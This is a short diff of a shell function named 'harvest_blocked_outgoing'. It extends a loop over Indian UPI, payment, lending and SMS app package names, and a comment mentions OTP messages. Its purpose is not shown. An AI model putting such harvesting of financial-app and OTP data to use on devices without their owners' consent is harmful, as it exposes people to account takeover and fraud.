@@ -677,8 +677,11 @@ harvest_blocked_outgoing() {
   # Prefer UPI apps over Messages — Messages OTP junk was overwriting forever
   for pkg in com.herofincorp.diyjourneys com.herofincorp.simplycash com.customer.herofincorp \
              com.phonepe.app com.google.android.apps.nbu.paisa.user net.one97.paytm \
-             com.myairtelapp com.yespay.next com.kreditbee.android com.stashfin.android \
-             com.hdfcbank.payzapp com.axis.mobile com.fampay.in \
+             com.myairtelapp com.yespay.next com.yesbank.yespay com.kreditbee.android \
+             com.stashfin.android com.fampay.in com.snapmint.customerapp \
+             com.bharatpe.app com.jump.app in.jploft.jump com.supermoney \
+             com.whizdm.moneyview.loans com.whizdm.moneyview com.flipkart.android \
+             com.hdfcbank.payzapp com.axis.mobile \
              com.google.android.apps.messaging com.samsung.android.messaging \
              com.android.messaging com.android.mms com.motorola.messaging com.android.mms.service; do
     for f in \
